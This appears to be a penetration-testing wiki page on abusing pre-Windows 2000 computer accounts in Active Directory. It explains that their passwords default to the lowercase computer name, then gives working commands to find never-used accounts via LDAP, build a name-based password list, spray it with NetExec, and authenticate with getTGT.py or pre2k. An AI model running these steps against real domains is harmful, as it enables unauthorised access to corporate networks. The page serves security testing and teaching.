## Theory
When a new computer account is configured as "pre-Windows 2000 computer", its password is set based on its name (i.e. lowercase computer name without the trailing $). When it isn't, the password is randomly generated.
Once an authentication occurs for a pre-Windows 2000 computer, according to [TrustedSec's blogpost](https://www.trustedsec.com/blog/diving-into-pre-created-computer-accounts/), its password will usually need to be changed.
## Exploit
Finding computer accounts that have been "pre-created" (i.e. manually created in ADUC instead of automatically added when joining a machine to the domain), but have never been used can be done by filtering the UserAccountControl attribute of all computer accounts and look for the value 4128 (32|4096) (deductible via the UserAccountControl flags):

- 32 - `PASSWD_NOTREQD`
- 4096 - `WORKSTATION_TRUST_ACCOUNT`

The [ldapsearch-ad](https://github.com/yaap7/ldapsearch-ad) tool can be used to find such accounts. Once "pre-created" computer accounts that have not authenticated are found, they should be usable with their lowercase name set as their password. This can be tested with NetExec (Python) for instance.
```bash
# 1. find pre-created accounts that never logged on
ldapsearch-ad -l $LDAP_SERVER -d $DOMAIN -u $USERNAME -p $PASSWORD -t search -s '(&(userAccountControl=4128)(logonCount=0))' | tee results.txt

# 2. extract the sAMAccountNames of the results
cat results.txt | grep "sAMAccountName" | awk '{print $4}' | tee computers.txt

# 3. create a wordlist of passwords matching the Pre-Windows 2000 generation, based on the account names
cat results.txt | grep "sAMAccountName" | awk '{print tolower($4)}' | tr -d '$' | tee passwords.txt

# 4. bruteforce, line per line (user1:password1, user2:password2, ...)
nxc smb $DC_IP -u "computers.txt" -p "passwords.txt" --no-bruteforce
```
!!! note
    You will see the error message `STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT` when you have guessed the correct password for a computer account that has not been used yet.

Testers can then change the Pre-Windows 2000 computer accounts' password (i.e. [rpcchangepwd.py](https://github.com/SecureAuthCorp/impacket/pull/1304), [kpasswd.py](https://github.com/SecureAuthCorp/impacket/pull/1189), etc.) in order to use it.
!!! info
    Alternatively, Filip Dragovic was able to authenticate using Kerberos without having to change the account's password
    ```bash
    getTGT.py $DOMAIN/$COMPUTER_NAME\$:$COMPUTER_PASSWORD
    ```
We also can automatically do aforementioned step by using [pre2k](https://github.com/garrettfoster13/pre2k)
```bash
# Unauthenticated usage
pre2k unauth -d domain -dc-ip dc_ip -inputfile list_machine_pre2k_account$
```